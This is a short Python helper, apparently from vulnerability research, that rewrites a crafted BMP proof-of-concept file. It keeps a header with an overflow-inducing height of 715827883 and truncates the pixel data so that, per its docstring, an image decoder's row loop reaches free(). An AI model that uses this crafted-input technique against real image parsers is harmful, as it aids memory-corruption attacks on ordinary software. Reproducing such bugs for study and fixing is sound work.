#!/usr/bin/env python3
"""Truncate the crafted BMP's pixel area so the row loop can reach free().

Same BITMAPINFOHEADER geometry as poc-chosen.bmp (width=2,
height=715827883, depth=24), but only one 6-byte row of pixel data. The
file-derived byte pattern is kept byte-identical for that row.
"""
import sys
from pathlib import Path

src = Path(sys.argv[1])
dst = Path(sys.argv[2])
raw = src.read_bytes()
assert len(raw) == 118 and raw[:2] == b"BM"
header = bytearray(raw[:54])
header[2:6] = (60).to_bytes(4, "little")
dst.write_bytes(bytes(header) + raw[54:60])
print(f"{dst} bytes={dst.stat().st_size} pixel={raw[54:60]!r}")
